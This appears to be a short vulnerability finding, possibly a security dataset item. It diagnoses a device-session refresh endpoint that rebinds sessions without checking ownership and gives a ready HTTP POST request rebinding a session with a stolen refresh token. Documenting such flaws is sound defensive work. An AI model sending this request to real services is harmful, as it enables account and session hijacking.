diagnosis: The endpoint updates the device fingerprint on deviceSessionId solely based on the valid tokenRecord, but does not verify whether the presenting client's IP or user identity matches the registered owner of the device session. An attacker who sniffs a refresh token can rebind the active session to their own device fingerprint.
exploit_request:
POST /api/auth/device-session/refresh HTTP/1.1
Host: auth.mobileapp.com
Content-Type: application/json

{"deviceFingerprint": "fp_attacker_device_9921", "refreshToken": "rt_live_884910248a"}
